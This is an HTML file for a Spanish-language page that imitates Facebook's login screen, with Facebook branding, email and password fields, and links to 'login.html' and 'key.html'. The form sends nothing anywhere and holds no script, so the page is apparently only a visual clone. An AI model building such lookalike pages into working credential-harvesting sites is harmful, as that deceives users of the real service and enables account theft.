<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <link rel="icon" type="image/x-icon" href="iconfb.ico"> 
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" type="text/css" href="login.css">
    <link href="https://fonts.googleapis.com/css2?family=Mali:wght@500&family=Poppins:wght@500&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Kanit&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Arimo&display=swap" rel="stylesheet">
    <title>Iniciar sesión en Facebook</title>
</head>
<body>
    <div class="section1">
        <h1>facebook</h1>
    </div>
    <div class="section2">
        <form method="post">
            <fieldset>
                <label class="form-label">Iniciar sesión en Facebook</label>
                <div class="mb-3">
                    <input type="email" class="form-control" id="Email" placeholder="Correo electronico o numero de telefono">
                </div>
                <div class="mb-3">
                    <input type="password" class="form-control" id="Password" aria-describedby="passwordHelpBlock" placeholder="Contraseña">
                </div>
                <button type="button" class="btn btn-primary btn-lg" id="button1"><a href="login.html">Iniciar Sesion</a></button>
                <a href="key.html">¿Has olvidado los datos de la cuenta?</a>
            </fieldset>
        </form>
    </div>
</body>
</html>
